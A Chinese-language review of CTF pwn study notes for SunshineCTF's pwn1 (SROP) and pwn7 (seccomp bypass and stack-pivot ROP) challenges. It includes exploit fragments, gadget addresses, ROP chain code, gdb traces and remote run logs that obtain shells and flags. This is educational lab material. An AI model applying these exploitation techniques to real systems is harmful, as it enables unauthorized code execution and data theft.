| `rt_sigframe` | 核心放在使用者堆疊上的「整包」結構（x86-64 上約 0xf8 bytes），由 `ucontext` 開頭 |
| `ucontext` | `rt_sigframe` 的前半段，包含 `uc_flags`、`uc_link`、`uc_stack`（佔 5 個 8-byte 欄位 = 0x28 bytes） |
| `struct sigcontext` | 緊接在後面、真正存「所有暫存器」的那段，`r8` 從 offset **0x28** 開始 |
| `sigframe`（本筆記的簡稱） | 就是 pwntools `SigreturnFrame()` 產生的那 0xf8 bytes；本題直接把它整包塞在堆疊上 |
```

### B5 「little-endian / big-endian」在兩份文件都是「用到才順口解釋」，沒有定義

`p64`、`u64`、封包長度、`p16` 陷阱都靠這個概念。
**建議在 `00_基礎知識` §1 名詞表新增一列，並在 §12 補一段**：

```markdown
| **little-endian（小端）** | 一個多位元組整數在記憶體裡「低位元組放低位址」。x86-64 是小端，所以 `p64(0x401040)` 的 bytes 是 `40 10 40 00 00 00 00 00`（反著看就對了）。 |
```

```markdown
> 🔴 **端序（endianness）**：x86-64 是 **little-endian**，所以 `p64(0x401040)` 產生
> `40 10 40 00 …`。**但協定/檔案格式不一定是小端**！pwn7 的封包長度欄位就是 **big-endian**，
> 這時不能用 `p16(4)`（它會給你 `04 00`），要自己寫 `b"\x00\x04"`。
```

### B6 pwn1 §5.3 frame 表：`csgsfs` 的「大小 6」會讓人算錯下一欄

**建議把該列改成**：`0xb8   8 (用到 6)   csgsfs   cs/gs/fs 各 2 bytes + 2 bytes padding，所以 err 從 0xc0 開始`

### B7 pwn1 §7 只貼遠端輸出，沒有本地輸出，也沒說本地 `flag.txt` 是假 flag

**建議在 §7 補**：

````markdown
本地跑（`python3 exploit.py`，要在 `pwn1/` 目錄下執行）：

```
[+] stack leak  = 0x7ffd1208cf68
[*] vuln buffer = 0x7ffd1208cee8

[+] raw output:
sun{LOCAL_DUMMY_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

[+] FLAG: sun{LOCAL_DUMMY_FLAG}
```

> 本地 `pwn1/flag.txt` 是主辦方附的假 flag（`sun{LOCAL_DUMMY_FLAG}`），
> 真 flag 只在遠端；`pwn1/FLAG.txt` 才是我們打到的真答案。
````
（同時把 `pwn1/exploit.py` 第 143 行的訊息
`flag not found (可能遠端已關閉，本地測試時沒有 flag.txt 是正常的)` 改成
`flag not found（本地會看到 sun{LOCAL_DUMMY_FLAG}；真 flag 要打 REMOTE）`——
因為 `pwn1/flag.txt` 其實存在。）

### B8 兩份文件都沒說「exploit.py 必須在題目目錄下執行」

`pwn1/exploit.py` 用 `process("./challenge")`、`pwn7/exploit.py` 用 `process("./service")`，
在 repo 根目錄執行會直接 `[ERROR] './challenge' does not exist`（我實測過）。
**建議在 `00_基礎知識` §12 執行方式、以及兩篇 notes 的一頁速查各補一句**：

```markdown
> ⚠️ 一定要 `cd pwn1/`（或 `cd pwn7/`）之後再跑，因為 exploit 用的是相對路徑 `./challenge`、`./service`。
> 或直接用 `wp/run_all.sh`（它會自動 cd 進各題目目錄）。
```

### B9 pwn7 §2.2 直接列出「解好的 BPF」，但沒教怎麼解 —— 新手不可能自己驗證

`0x101000015` 這種 8-byte 立即數，初學者看不出是 `code/jt/jf/k` 四個欄位。
**建議在 BPF 清單前後補**：

````markdown
`seccomp` 的過濾器是一串固定 8 bytes 的 BPF 指令，每條的欄位是：

```
struct sock_filter {           // 每條 8 bytes
    __u16 code;   // 要做什麼（0x20 = LD W ABS, 0x15 = JEQ K, 0x06 = RET K）
    __u8  jt;     // 條件成立時往後跳幾條
    __u8  jf;     // 條件不成立時往後跳幾條
    __u32 k;      // 比較值 / 回傳值
};
```

所以 `service` 裡 `0x40132c`~`0x4014a0` 那一堆 `movabs` + `mov [rsp+0x4xx],rax`
就是在**一條一條把 21 條指令寫到堆疊上**（`[rsp+0x20]` 是 `sock_fprog` 的 `len = 0x15 = 21`，
`[rsp+0x28]` 是 filter 指標 `rsp+0x420`）。把那些立即數拆開就是上面那份清單，例如：

| 位址 | 立即數 | 拆解 | 意義 |
|---|---|---|---|
| `[rsp+0x420]` | `0x0000000400000020` | code=0x20, jt=0, jf=0, k=4 | `LD W ABS 4`（讀 `seccomp_data.arch`） |
| `[rsp+0x428]` | `0xc000003e00010015` | code=0x15, jt=1, jf=0, k=0xc000003e | `JEQ AUDIT_ARCH_X86_64`，成立就跳過下一條 |
| `[rsp+0x430]` | `0x8000000000000006` | code=0x06, k=0x80000000 | `RET KILL_PROCESS` |
| `[rsp+0x440]` | `0x0000000001000015` | code=0x15, jt=0, jf=1, k=0 | `JEQ 0`（read）→ 成立走下一條 allow，否則跳過 |
| `[rsp+0x448]` | `0x000000007fff0006` | code=0x06, k=0x7fff0000 | `RET ALLOW` |

（也可以裝 `seccomp-tools`（Ruby gem：`gem install seccomp-tools`）後跑
`seccomp-tools dump ./service`，它會直接印出可讀的清單。）
````

### B10 pwn7 §6.2 的 stack pivot 沒有記憶體圖 —— 這是全篇最需要圖的地方

**建議在 §6.2 的流程後面插入**：

````markdown
```
.bss 的實際長相（全部都是固定的已知位址）：

0x405060  key（4 bytes，XOR 加解密用）
0x405064  槽計數器（4 bytes）
0x405080  fd 槽 #0 {state=2, fd=flag.txt}     ← index=-4 打到的目標
0x40548c  fd 槽 #1
0x405898  fd 槽 #2
0x4060b0  儲存槽表（16 槽 × 0x40c）
              ^
              └── 0x4060b0 + (-4)*0x40c = 0x405080

0x40a168  ← pop rsp 的落點（PIVOT_TOP）；這裡是 .bss 的 0，所以 pop r13/r14/r15 讀到 0
0x40a180  ← NOTE 0 寫進去的 8 bytes（= 0x401f07）；ret 從這裡取值
0x40a188  ← 第一次 read(0, rsp, 0xff) 的目標 = A1
```

```
SUBMIT 溢位後的搬移過程（每一步的 rsp）：

  SUBMIT 的 ret  → 0x401523 (pop rsp; pop r13; pop r14; pop r15; ret)
     pop rsp     讀 [S+0x50] = 0x40a168      → rsp = 0x40a168
     pop r13     讀 [0x40a168] = 0            → rsp = 0x40a170
     pop r14     讀 [0x40a170] = 0            → rsp = 0x40a178
     pop r15     讀 [0x40a178] = 0            → rsp = 0x40a180
     ret         讀 [0x40a180] = 0x401f07     → rsp = 0x40a188
  0x401f07: read(0, 0x40a188, bl)             ← 之後的鏈都在這裡接
```
````

### B11 pwn7 階段 1 的 `p64(0) * 3` 其實是「死資料」，筆記沒說

原文註解寫成「`pop rsp; ...; ret`」，會讓新手以為那 3 個 0 是被 `pop r13/r14/r15` 吃掉的。
**建議改成**：

```python
stage  = b'A' * 64 + p64(0xff)                        # 塞滿 0x40 buffer + saved rbx=0xff
stage += p64(POP_RSP) + p64(PIVOT_TOP) + p64(0) * 3   # pop rsp 之後 rsp 就跑去 .bss 了
# 注意：上面那 3 個 p64(0) 其實不會被讀到！pop rsp 一執行完 rsp 就變成 PIVOT_TOP，
# 後面 pop r13/r14/r15 讀的是 .bss 裡 [0x40a168]~[0x40a178] 的值（那裡本來就是 0）。
# 留著只是為了讓 stage 長度剛好 112，對齊好看。
```

### B12 pwn7 沒有解釋「三段鏈的記憶體佈局是一樣的」＋ `0x40`/`0x48` 的意義

**建議在 §6.3 表格後面加一張表**：

```markdown
每一段鏈（d1/d2/d3）的佈局都一樣，只是位址不同：

| 位址 | 內容 | 誰讀它 |
|---|---|---|
| `A + 0x00` ~ `A + 0x3f` | 隨便（0x40 bytes 緩衝區） | `read(0, rsp, 0xff)` 寫進來 |
| `A + 0x40` | `rbx`（下一段的讀取長度，通常 0xff） | `add rsp,0x40` 之後的 `pop rbx` |
| `A + 0x48` | 鏈的第 0 個 qword（`ret` 的目標） | `pop rbx` 之後的 `ret` |
| `A + 0x48 + 8n` | 鏈的其他 qword | 每個 gadget 的 `ret` |

| 段落 | A（=`read` 目標） | 實際數值 | 備註 |
|---|---|---|---|
| d1 | `A1 = NOTES+8` | `0x40a188` | 洩漏 XOR key |
| d2 | `A2 = A1+0x48+8*11` | `0x40a228` | 寫偽造封包進 fd 3 |
| d3 | `A3 = A2+0x48+8*14` | `0x40a2e0` | 接 `RELAY_RX` 印 flag |
```

### B13 pwn7 §9.4 說「鏈的起點在 `buf+0x48`」，但沒說 `0x401f07` 的 `read` 目標就是「鏈開始的位置」

新手容易以為「鏈要放在 read 目標 + 0x48」，其實 `read` 是從 `rsp` 開始寫，
而 `rsp` 在進入 `0x401f07` 時**正好就是鏈開始的位置**（因為它是由前一段鏈最後的
`SUBMIT_READ` 這個 `ret` 抵達的）。**建議補一句**：

> 因為 `0x401f07` 是用 `ret` 跳進去的，那一刻 `rsp` 就指向「前一段鏈結束的下一個 qword」，
> 所以 `read(0, rsp, 0xff)` 的寫入起點 = 下一段鏈的起點。這就是 `A2 = A1 + 0x48 + 8*len(chain)`
> 這個公式的由來（`0x48` 是鏈相對於 `A1` 的起點，`8*len(chain)` 是上一段鏈的長度）。

### B14 pwn7 沒有解釋 checksec 顯示 `SHSTK: Enabled / IBT: Enabled`，但純 `ret` 的 ROP 還是成功

這是新手一定會問的矛盾（文件 00 只說「遠端核心不一定啟用」）。
**建議在 pwn7 §1 的 checksec 區塊下補**：

```markdown
> ⚠️ `SHSTK` / `IBT` 這兩個是 **ELF 檔裡的一個屬性註記**（`readelf -n service` 可見
> `.note.gnu.property` 的 `x86 feature: IBT, SHSTK`），代表「編譯時說這支程式支援 CET」，
> **不等於執行時有啟用**。影子堆疊（SHSTK）要 CPU + 核心 + 執行緒都真正開啟才會攔 `ret`；
> 本題的 exploit 用純 `ret` 就能成功（本地與遠端都實測成功），證明遠端沒有啟用 SHSTK。
> 驗證方式：`readelf -n service`，以及在 exploit 成功時觀察「`ret` 沒有被擋」。
```

### B15 兩份文件都沒有「完整可用」的 SROP 前置提醒：`context.arch` 必須先設

`SigreturnFrame()` 沒有 `context.arch` 會直接失敗（我實際踩到）：
`[ERROR] kernel architecture must be specified`。
**建議在 `00_基礎知識` §11.4 與 `99_速查表` §6 最前面各加一行**：

```markdown
> ⚠️ 用 `SigreturnFrame()` 之前一定要設 `context.arch = 'amd64'`（或 `context.clear(arch='amd64')`），
> 否則 pwntools 會直接報 `kernel architecture must be specified`。
> 這也是兩支 exploit 開頭都有那行的原因。
```

### B16 `00_基礎知識` 通篇用假的位址當範例，沒說「這是佔位符」

`0x401234`、`BINSH_ADDR`、`SYSTEM_ADDR`、`POP_RDI` 反覆出現，新手會拿去照抄然後失敗。
**建議在 §10.2 開頭加一句**：

> 以下出現的 `0x401234`、`BINSH_ADDR`、`SYSTEM_ADDR` 都是**佔位符**（假位址），
> 你要用 `ROPgadget`/`readelf` 從**自己題目的 binary** 找出真正的位址再填進去。

### B17 `00_基礎知識` 沒定義 `shellcode`、`TLS`、`ZF` 等被用到的詞

* `shellcode`（§4.2 就用）→ 名詞表新增：
  `| **shellcode** | 一段「執行起來會幫你開 shell」的機器碼（通常用 `execve("/bin/sh",0,0)` 組出來）。堆疊可執行時可以直接把它的 bytes 當輸入送進去，再跳過去執行。 |`
* `TLS`（§4.1 的註解「存在 TLS」）→ 改成
  `; 讀 canary（存在每個執行緒自己的 TLS 區；fs 這個段暫存器指向它，fs:0x28 就是該區裡的 canary）`
* `ZF`（§5.2 的 `je/jz` 寫「ZF=1」）→ 補一行
  `> je/jne 看的 ZF 是「上一次 cmp/test 結果是否為 0」的旗標；ZF=1 代表相等。`

### B18 `00_基礎知識` §9 的漏洞對照表把讀者指向不存在的筆記檔

（詳見第 4 節 S1）——對完全新手而言，「照閱讀順序讀下去」是第一件事，
指到不存在的檔案會直接讓人卡死。

---

## 3. 術語未定義 / 順序問題

| # | 檔案 | 術語 | 首次出現 | 問題 | 建議 |
|---|---|---|---|---|---|
| T1 | 00 | `non-PIE` | §3 第 129 行 | 在 §4.3 定義 PIE 之前就用了 | 該行改成「…所以所有指令位址都是固定的（這種 binary 叫 **non-PIE**，見 4.3 節）」 |
| T2 | 00 | `.got` / `.got.plt` | §3 表（有註「見第 8 節」）與 §4.4（**無**註） | §4.4 RELRO 整節都在講 GOT，但 GOT 到 §8 才解釋 | §4.4 開頭加「（`.got.plt` 是什麼見第 8 節）」 |
| T3 | 00 | `PLT` | §8 標題 | 標題出現即定義，OK；但 §10 的 `write@plt`（第 66 行 cheat sheet）沒說明 | cheat sheet §4 該列補「`@plt` 結尾＝呼叫外部函式的跳板（見 00 第 8 節）」 |
| T4 | 00 | `canary` / `RELRO` / `gadget` | §4.1 / §4.4 / §1 名詞表 | `gadget` 有定義（在 ROP 那列），`canary`、`RELRO` 在 §4 標題就有定義 | 可在 §1 名詞表加 `canary`、`RELRO` 兩列，方便回頭查 |
| T5 | 00 | `ZF`、`TLS`、`shellcode` | §5.2、§4.1、§4.2 | 未定義 | 見 B17 |
| T6 | 00 | `movaps` 對齊 | §10.4 | 定義了但條件寫錯（E11） | 見 E11 |
| T7 | pwn1 | `sigframe` | §5.2（定義在 §5.3） | 順序顛倒 | 見 B4 |
| T8 | pwn1 | `R0` | §6 步驟 1 | 只用括號帶過「R0 是進入點執行時的 rsp」 | 建議改成「`R0` = `_start` 第一道指令執行時的 `rsp`（本題＝`leak+8`）」 |
| T9 | pwn1 | `little-endian` | §6 步驟 1 | 順口解釋，非定義 | 見 B5 |
| T10 | pwn7 | `seccomp` / BPF | §2.2 | 先給結論清單才解釋 | 見 B9 |
| T11 | pwn7 | `IPC`（標題） | 標題 | 從未定義（其實是指用 socketpair 的 fd 3 當通道） | 標題或 §2 補一句「這裡的『IPC』指的是父子行程用 `socketpair` 那條 fd 3 通道互相傳封包」 |
| T12 | pwn7 | `stack pivot` | 標題/§6.2 | 有定義但缺圖 | 見 B10 |
| T13 | pwn7 | `PR_SET_NO_NEW_PRIVS` / `SECCOMP_SET_MODE_FILTER` | §2 偽碼 | 只出現常數名，沒說那是什麼 | 補「`PR_SET_NO_NEW_PRIVS`(38) 是 seccomp 的前置條件（要先用 `prctl` 宣告『我不會因為這個程式而取得新權限』）；`SECCOMP_SET_MODE_FILTER`(1) 是 `seccomp()` syscall（編號 317）的模式參數，代表『我要裝一組 BPF 過濾器』」 |
| T14 | 00 vs pwn7 | `p16` 端序 | 00 §14 沒提；pwn7 §5.1 有提 | 端序知識只在 pwn7 出現，00 沒鋪 | 見 B5 |
| T15 | cheat sheet | `__free_hook` / hook | §8 | 「hook」未定義 | 補「hook = glibc 內部在特定時機會呼叫的函式指標，改掉它就等於劫持控制流（2.34 後已被移除）」 |

---

## 4. 結構與一致性問題（C）

### S1 文件指向不存在的檔案（會直接卡死新手）

* `wp/00_基礎知識_從零開始.md` 第 9 行的閱讀順序、以及附錄對照表，
  指向 `../pwn4/notes.md`，但**這個檔案目前不存在**：
  ```
  for d in pwn1 pwn2 pwn3 pwn4 pwn5 pwn6 pwn7; do [ -f $d/notes.md ] && echo "$d YES" || echo "$d MISSING"; done
  → pwn4 MISSING        （00:30 時 pwn6 也還 MISSING，00:36 已補上）
  ```
* `00_基礎知識` §9 的漏洞對照表也把 pwn4 寫成「Heap（UAF / overflow）→ `../pwn4/notes.md`」。
* 建議：改成「（pwn4 筆記待補）」或先移除這個連結，避免讀者以為自己環境壞了。

### S2 兩支 exploit 一定要在題目目錄下執行（文件沒寫）

* 實測在 repo 根目錄執行 → `[ERROR] './challenge' does not exist`、`[ERROR] './service' does not exist`。
* `wp/run_all.sh` 已經正確處理（`cd "$ROOT/$t"`），但文件完全沒提；建議在兩篇 notes 的「一頁速查」加一行執行方式（見 B8）。

### S3 pwn1 本地 flag 檔與 exploit 訊息不一致

* `pwn1/flag.txt` 存在（內容 `sun{LOCAL_DUMMY_FLAG}`），但 `pwn1/exploit.py` 第 143 行說
  「本地測試時沒有 flag.txt 是正常的」。建議改訊息，並在 notes §7 補本地輸出（見 B7）。

### S4 引用的程式碼與 `exploit.py` 逐字比對結果

| notes 引用 | exploit.py（最新版行號） | 結果 |
|---|---|---|
| pwn1 §6 步驟 1 `leak = u64(p.recv(8).ljust(8, b"\x00"))`、`buf = leak - 0x80` | 第 77–78 行 | ✅ 完全一致（pwn1 未被改動） |
| pwn1 §6 步驟 2 `p.send(b"A" * 0x18)` | 第 85 行 | ✅ |
| pwn1 §6 步驟 3 payload 組法（含 `ljust(SH_OFF)`、`ljust(0x400)`） | 第 114–121 行 | ✅ 一致（notes 省略了 `frame = SigreturnFrame(...)` 的設定，但 §5.3 有寫） |
| pwn1 §6 步驟 4 `p.send(b"/bin/sh\x00" + b"C" * 7)` | 第 128 行 | ✅ |
| pwn1 §6 步驟 6 `p.sendline(b"cat flag.txt /flag …")` | 第 134 行 | ✅ |
| pwn7 §7 階段 0 `io.send(b'NOTE 0 ' + p64(0x401f07)[:3] + b'\n')` | 第 102 行（用 `p64(SUBMIT_READ)[:3]`） | ✅ 等價 |
| pwn7 §7 階段 1 stage 組法 | 第 107–110 行 | ✅（notes 未提 `assert len(stage) == 112`，無妨） |
| pwn7 §7 階段 2 chain 組法＋「rax = 3、共 6 bytes」 | 第 114–124 行 | ✅ 經 00:34 修改後**已一致且正確** |
| pwn7 §7 階段 3 chain 組法＋「rdx = 上一次 write 回傳值 = 3」 | 第 141–147 行 | ✅ |
| pwn7 §7 階段 4 `d3[0x40:0x48]=p64(RESP)`、`d3[0x48:0x50]=p64(RELAY_RX)` | 第 156–157 行 | ✅ |
| pwn7 notes 沒有引用 `time.sleep(0.7)`、`io.recvn(6)`、`recvall(timeout=3)`、`assert` | 第 109、127、154、160 行 | ⚠️ 仍未引用（`recvn(6)` 現在在 §7 內文有解釋了 ✅，但 `time.sleep(0.7)` 只在 §9 #8 提到、`recvall` 完全沒提） |

* `pwn7/exploit.py` 第 114–117 行的註解在 00:34 已修成正確版本（`rax = 3`、6 bytes）✅；
  **第 41 行「glibc wrapper 會把 rdx 弄髒」仍然錯**（見 E3）。

### S5 checksec 輸出區塊與實際輸出的差異

* pwn1 notes §1 把兩行合併成
  `NX: NX unknown - GNU_STACK missing   (實際上是 Stack: Executable)`，
  實際 `checksec` 輸出是五行（RELRO/Stack/NX/PIE/Stack）。建議直接貼原始五行，
  並用一句話解釋「`GNU_STACK missing` ⇒ 核心預設給可執行堆疊（本題 Stack: Executable）」。
* pwn7 notes §1 少了實際輸出裡的 `RUNPATH: b'$ORIGIN'`。這一條其實很重要：
  本地若把題目附的 `libc.so.6` 放在 `service` 旁邊，載入器就會優先用它；
  本機 `pwn7/` 裡沒有 libc，所以本地是用系統 glibc（我這邊是 2.44），
  遠端 glibc 版本可能不同 → 值得在 §1 補一句「本地/遠端 libc 不同不影響本題，因為我們完全沒用到 libc 的位址」。

### S6 術語一致性

| 項目 | 狀況 | 建議 |
|---|---|---|
| `rbp` 框架指標 vs 「返回位址 offset」 | 00 說「offset = (rbp-&buf)+8」，pwn1/pwn7 都用「buf + 0x80 / buf + 0x48」 | 兩者等價，但 00 沒說「這兩種講法一樣」；建議在 00 §6.3 補一句 |
| 「sigframe」 | pwn1 用 `sigframe`，00 用 `SigreturnFrame`/`rt_sigframe` | 統一：第一次出現時寫「`SigreturnFrame`（本筆記簡稱 sigframe）」 |
| 「洩漏」vs「leak」 | 兩份文件混用 | 可接受，但建議 00 名詞表寫「leak（洩漏）」並在後續統一用 `leak` |
| 對齊用 `ret` 的位置 | 00 §10.3 放 `pop rdi; binsh; ret; system`；00 §10.4 註解說 `ret` 在 `SYSTEM` 前；cheat sheet §5.1 卻放 `RET` 在 `POP_RDI` **之前** | 三處說法不同（效果等價但新手會困惑）；建議統一成一種並註明「放在哪都行，重點是總共多走 8 bytes」 |
| 執行範例檔名 | 00 §12 `./ld-linux.so`；§15 `./ld-linux-x86-64.so.2` | 統一名稱 |
| flag 檔命名 | pwn1 用 `FLAG.txt`、pwn7 用 `FLAG_REMOTE.txt`，`00_recon.md` 卻只列 pwn1 的 flag | 建議在 00 附錄或 README 統一說明命名規則（例：`FLAG.txt`＝本地/題目附件、`FLAG_REMOTE.txt`＝遠端實打得證的 flag） |
| 一頁速查 vs 內文 | pwn7 §10 寫「漏洞 2 : 保險箱 op3 用 movsxd + jg」——實際 `movsxd`+`jg` 是**漏洞 3**（第 44–47 行 exploit 註解也寫「漏洞 3」） | 速查表的編號（漏洞 1 SUBMIT / 漏洞 2 RELAY 只送 len=0 / 漏洞 3 負索引）要跟 §6、exploit 註解統一 |
| 00 §9 對照表 | 說「pwn4（heap 題）」但 `pwn4/notes.md` 不存在；pwn2/pwn3/pwn4/pwn5/pwn6 的技巧我**沒有**驗證（不在本次審查範圍） | 待 pwn4/pwn6 筆記完成後再對照 |

### S7 `pwn7/notes.md` §12 的「第 9 個 byte 是多的，無害」缺理由

實際上是：`req` 只有 8 bytes，但鏈切成 3+3+3 = 9 bytes 送出，
第 9 個 byte 是 `d2[8]`（= 0x00）。它會留在 socket 裡等保險箱下一次讀標頭，
對本次流程無害。建議補一句說明，否則新手會以為「多送 1 byte 不會被檢查」是通則。

---

## 5. 實測結果（真實輸出）

### 5.1 pwn1 本地（在 `pwn1/` 目錄下）

```
$ python3 exploit.py
[x] Starting local process './challenge'
[+] Starting local process './challenge': pid 3505126
[+] stack leak  = 0x7ffd1208cf68
[*] vuln buffer = 0x7ffd1208cee8

[+] raw output:
sun{LOCAL_DUMMY_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

[+] FLAG: sun{LOCAL_DUMMY_FLAG}
[*] Stopped process './challenge' (pid 3505126)
```

### 5.2 pwn1 遠端（跑 3 次）

```
$ python3 exploit.py REMOTE        # 第 1 次
[x] Opening connection to chal.sunshinectf.games on port 26003
[x] Opening connection to chal.sunshinectf.games on port 26003: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26003: Done
[+] stack leak  = 0x7ffc9e5cc938
[*] vuln buffer = 0x7ffc9e5cc8b8

[+] raw output:
sun{r3caLl_ev3Ry_reGist3r_sR0p}
uid=1337(total_recall) gid=1337(total_recall) groups=1337(total_recall)
DONE

[+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}

--- 第 2 次 ---  [+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}
--- 第 3 次 ---  [+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}
```

**pwn1：PASS（本地 1/1、遠端 3/3）**，與 `pwn1/FLAG.txt`、notes §7 記載的 flag 完全一致。

### 5.3 pwn7 本地（**00:34 改檔後重新實測**）

```
$ python3 exploit.py
[x] Starting local process './service'
[+] Starting local process './service': pid 3515649
[*] stage2 pre=b'OK\n' leak=83c2b9ee0000 A2=0x40a228
[+] XOR key = 83c2b9ee
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[+] Receiving all data: Done (30B)
[*] Process './service' stopped with exit code -11 (SIGSEGV) (pid 3515649)

[+] raw  : b'OK\nSUNSHINE{local_test_flag}\n\n'
[+] FLAG: SUNSHINE{local_test_flag}
```

* 註：結尾的 `SIGSEGV` 是預期行為（flag 印完之後鏈就走到盡頭），不是失敗。
* `leak=83c2b9ee0000` ＝ **6 bytes**（與筆記 §7 的說明一致）；`A2/A3/RESP` 與公式一致。
* 00:34 改檔**之前**的本地實測（原版本）：`leak=070968f00000`、`FLAG: SUNSHINE{local_test_flag}` ✅
  ——兩個版本都能跑。

### 5.4 pwn7 遠端（**00:34 改檔後重新實測，跑 3 次**）

```
$ python3 exploit.py REMOTE        # 第 1 次
[*] stage2 pre=b'OK\n' leak=320d68200000 A2=0x40a228
[+] XOR key = 320d6820
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[+] raw  : b'OK\nsun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n\n'
[+] FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}

--- 第 2 次 ---  leak=260a854f0000  XOR key = 260a854f  FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
--- 第 3 次 ---  leak=52a836a50000  XOR key = 52a836a5  FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
```

00:34 改檔**之前**的遠端實測（原版本）也跑過 3 次，3/3 成功
（`leak=8e598a210000` / `b725bff4` / `f6668c4e`）。

**pwn7：PASS（本地 1/1、遠端 3/3；改檔前後兩個版本都 PASS）**，與 `pwn7/FLAG_REMOTE.txt` 一致；
遠端每次的 XOR key 都不同（本次 `320d6820` / `260a854f` / `52a836a5`），
證明 key 真的隨 `getpid()` 而變、且我們的洩漏法有效。

### 5.5 本次用到的關鍵 gdb 觀測值

```
pwn1（附錄 B）:
[0x401054] rsp=0x…df18  rsi=0x…de98     ← 第一次 read: dest = buf
[0x401054] rsp=0x…df20  rsi=0x…dea0     ← 第二次 read: dest = buf + 0x08   (E4)
[0x401069] rsp=0x…df28  rax=15          ← = buf + 0x90 (FRAME_OFF 正確)
[0x401069] rsp=0x4141414141414141 rax=59 ← sigframe 的 rsp/rax 被核心還原

pwn7（附錄 A / C）:
[0x401f07] rsp=0x40a188 bl=-1(=0xff)    ← A1 = NOTES+8
[after 0x401f07 read] rax=255
[before OK-write 0x401f2a] rax=255
[0x401c32] rax=3 rdi=1 rsi=0x405060     ← 鏈開始時 rax 已被 write("OK\n") 蓋成 3 (E1)
[0x401c32] rax=3 rdi=1 rsi=0x405063
[0x401f07] rsp=0x40a228 (第二次) / rsp=0x40a2e0 (第三次)  ← A2/A3 公式正確
[0x401fda] rsp=0x40a330 rbx=0x40a340 => rsp+0x10=0x40a340  ← A3+0x50 (E2)
```

**總結：兩題 exploit 都能跑、flag 都對。錯的不是 exploit，是筆記裡的「為什麼」。**

---

## 6. 總評

### 分數：**6 / 10**（以「完全沒學過 ROP/SROP 的人能不能靠它學會」為標準）

> 註：這個分數是對**00:35 的最新版**打的。00:34 那次修改把原本最大的錯誤（E1 的
> 「洩漏 255 bytes」）在 §7 內文與 exploit 註解裡修好了，**分數因此從 5 拉到 6**；
> 但同一個錯誤的說法還留在 §10 一頁速查（第 769 行），而且 E2/E3/E5 三個「推導錯、答案碰巧對」
> 的問題**這次沒有被一起修**。若把下面 5 項做完，這份文件可以到 **7.5~8**。

**優點**（真的有，而且不少）
* 結構完整：00 → pwn1 → 其他題，名詞表、SOP、速查表、常見坑都有。
* pwn1 的 SROP 教學是罕見的「從 `push rsp` 講起」的寫法，觀念正確、步驟清楚；
  `0x80`/`0x90` 這兩個關鍵 offset 我實測**完全正確**；SigreturnFrame 偏移表**全對**。
* pwn7 的 seccomp 白名單、槽表位址、負索引算術、XOR keystream、`ja`/`jg` 教學
  **全部查證正確**，而且 exploit 本地＋遠端都真的能拿 flag（改檔前後各 3 次都穩定）。
* 00:34 新增的「⚠️ `rax` 到底是多少？這裡很反直覺 + 典型 ROP 陷阱」是全篇最好的一段教學
  —— 這正是新手最容易錯、而多數 writeup 不會講的地方。

**扣分原因**
1. 同一個「洩漏 255 bytes」錯誤還殘留在 §10 一頁速查（E1），與已經修好的 §7 內文互相矛盾
   —— 新手常常只看一頁速查，這反而是最容易被讀到的地方。
2. 三處「推導過程錯、答案碰巧對」（E2 的 `A3+0x58`、E3 的 glibc `rdx` 神話、E5 的 `test al,al`）
   ——對「只想抄答案」的人沒差，但對「想學會」的人是有害的，會建立錯誤心智模型。
3. 完全沒有任何一張記憶體佈局圖（pwn7 尤其需要：`.bss` 0x405060/0x405080/0x4060b0/0x40a168 的關係）、
   兩篇都沒有可重跑的 gdb 證據腳本（pwn1 §3.3 只有「我看到的數字」；pwn7 完全沒有）。
4. 前置術語（little-endian、shellcode、BPF 8-byte 欄位結構、`context.arch`）缺定義或缺提醒；
   文件還指向不存在的 `pwn4/pwn6 notes.md`。

### 影響最大的 5 個修改（照這個順序做）

1. **修 E1 的殘留**：`pwn7/notes.md` 第 769 行 `write(1, 0x405060, 0xff)` 改成
   「鏈開始時 `rax = 3` → `write(1, KEY, 3)` + `write(1, KEY+3, 3)` = 6 bytes」（內文已修好，只差這行）。
2. **修 E3**（3 處）：刪掉「glibc read/write wrapper 會把 `rdx` 弄髒」這個神話，
   改成「這支 binary 沒有 `pop rdx`，所以設不了長度」——
   出現在 notes §6（532–533）、§9 #5（741）、exploit.py 第 41 行。
3. **修 E2 與 E5**：`rsp = A3+0x50`（`RESP = rsp+0x10`）；`RELAY` 的 `ax = 0` 是
   `0x401fb2 xor eax,eax` 造成的（清單要補引這條指令）。
4. **補圖與可重跑證據**：pwn7 `.bss` 記憶體地圖＋三段鏈 `A+0x40`/`A+0x48` 佈局表（B10、B12）、
   pwn1 payload 佈局圖與 3 次 read / 2 次 send 對照表（B3）、
   附錄 A/B/C 的 gdb 腳本放進 pwn1 §3.3 與 pwn7 §6.3，並強調「位址每次不同、要看差值」（B1）。
5. **前置知識補洞**：little-endian 定義（B5）、`context.arch` 必須先設（B15）、
   「exploit.py 要在題目目錄下執行」（B8）、BPF 8-byte 欄位拆解（B9）、
   SHSTK/IBT 只是 ELF 屬性、`ret` 仍然可用（B14）。

---

## 附錄：本次使用的驗證腳本（可直接重跑）

### A. pwn7 驗證「鏈開始時 rax = 3」（E1）

```python
# 產生輸入檔
from pwn import *
context.arch='amd64'
POP_RSP=0x401523; POP_RDI=0x401529; POP_RSI=0x401dd5; POP_RBX=0x401f33
WRA=0x401c32; SR=0x401f07; NOTES=0x40a180; KEY=0x405060
stage  = b'A'*64 + p64(0xff) + p64(POP_RSP) + p64(NOTES-0x18) + p64(0)*3
assert len(stage)==112
d1 = bytearray(b'\x00'*255); d1[0x40]=0xff
chain=[POP_RDI,1,POP_RSI,KEY,WRA, POP_RSI,KEY+3,WRA, POP_RBX,0xff,SR]
d1[0x48:0x48+8*len(chain)] = b''.join(p64(x) for x in chain)
